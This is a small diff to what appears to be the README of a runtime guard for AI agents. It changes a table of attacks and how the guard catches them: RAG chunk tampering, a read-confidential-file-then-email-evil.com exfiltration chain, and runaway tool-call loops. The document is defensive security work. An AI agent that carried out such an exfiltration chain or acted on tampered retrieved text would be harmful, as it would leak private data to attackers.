@@ -54,3 +54,4 @@ All Stage 4 inspections run in under **100 microseconds**, ensuring that PRIVGUA
 | **RAG Chunk Hash Tampering** | Retrieved chunk text altered in vector DB | SHA-256 chunk hash comparison | Quarantined | Logged as `RETRIEVAL_TAMPERING` |
 | **MITRE T1700 Exfiltration Chain** | `read_file(confidential)` -> `send_email(evil.com)` | Dynamic Task Taint Propagation | Outbound tool blocked | Logged as `DATA_EXFILTRATION` |
 | **Runaway Agent Looping** | 3 consecutive identical tool calls | Sliding-window parameter fingerprint match | `REQUIRE_APPROVAL` | Prevents infinite billing loop |
+
